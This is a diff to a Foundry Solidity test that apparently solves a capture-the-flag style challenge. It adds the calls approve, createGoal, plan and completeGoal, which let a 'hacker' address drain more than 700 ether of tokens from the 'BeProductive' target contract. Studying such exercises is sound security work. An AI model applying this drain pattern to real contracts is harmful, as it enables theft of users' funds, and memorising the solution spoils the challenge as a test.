@@ -28,9 +28,16 @@ contract BeProductiveTest is Test {
  
     function test_GetThisPassing_4() public {
         address hacker = address(0xBAD);
+        address targetAddr = address(target);
+        uint256 initialBalance = token.balanceOf(hacker);
         
         vm.startPrank(hacker);
         
+        token.approve(targetAddr, initialBalance);
+        target.createGoal(initialBalance, 50 ether + 1);
+        target.plan(token.balanceOf(targetAddr) - initialBalance);
+        target.completeGoal();
+
         vm.stopPrank();
 
         assertGt(token.balanceOf(hacker), 700 ether);
